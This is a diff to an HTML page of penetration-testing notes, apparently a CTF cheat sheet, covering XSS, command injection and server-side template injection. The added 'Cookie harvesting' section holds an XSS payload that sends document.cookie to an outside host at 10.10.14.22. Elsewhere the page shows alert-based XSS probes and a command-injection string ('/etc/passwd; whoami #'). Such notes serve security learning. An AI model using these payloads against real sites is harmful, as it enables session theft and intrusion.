@@ -92,6 +92,7 @@
                 <div class="notion-body">
                     <h2>XSS</h2>
                     <ul>
+                        <p>Remember to try all diferent inputs to detect XSS</p>
                         <h3>Links of interes</h3>
                         <ul>
                             <li> <a class="notion-link" href="https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#other-useful-attributes"> XSS Cheatsheet</a> <br> </li>
@@ -102,6 +103,11 @@
                         <pre><code class="language-js">&lt;script&gt; alert('') &lt;/script&gt;</code></pre>
                         <pre><code class="language-js">&lt;img src =q onerror=alert()&gt;</code></pre>
                         <pre><code class="language-js">&lt;link&gt; rel="stylesheet" href="javascript:alert('');"&gt;</code></pre>
+
+                        <h3>Cookie harvesting</h3>
+                        <p>Once you have identified an XSS attempt to capture cookies</p>
+                        <pre><code class="language-js">&lt;img src="1" onerror=fetch("http://10.10.14.22:8082/"%2Bdocument.cookie)&gt;</code></pre>
+                        
                         
                         <h3>Situations</h3>
                         
@@ -139,6 +145,7 @@
     xhr.send();
 &lt;/script&gt;
 </code></pre>
+
                         <p> Avoiding WAF</p>
                         In other situations where the WAF blocks most of the tags, a brute force attack can be carried out to try the tags that are allowed. In the links above you will find a list of tags and attributes.
                     </ul>
@@ -151,6 +158,14 @@
                         <p>In case you are trying to inject code and you know that in the background there is a bash file which will reciep your command you can try to use</p>
                         <p><b>;</b> to stop the current command and execute the following and <b>#</b> to comment the rest</p>
                         <pre><code class="language-bash">/etc/passwd; whoami #</code></pre>
+                    </ul>
+                </div>
+
+                <div class="notion-body">
+                    <h2>SSTI (Server Side Template Injection)</h2>
+                    <ul>
+                        <p>All payloads can be found <a class="notion-link" href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection">Here</a></p>
+                        <p>Template injection allows an attacker to include template code into an existing (or not) template. A template engine makes designing HTML pages easier by using static template files which at runtime replaces variables/placeholders with actual values in the HTML pages</p>
                     </ul>
                 </div>
             
@@ -241,7 +256,7 @@
             </div>   
             
             <div class="notion-header"> 
-                <h1 id="Sync clock rate">Sync clock rate</h1>
+                <h1 id="Sync clock rate">Sync clock rate (Windows)</h1>
             </div>
 
             <div class="notion-body">
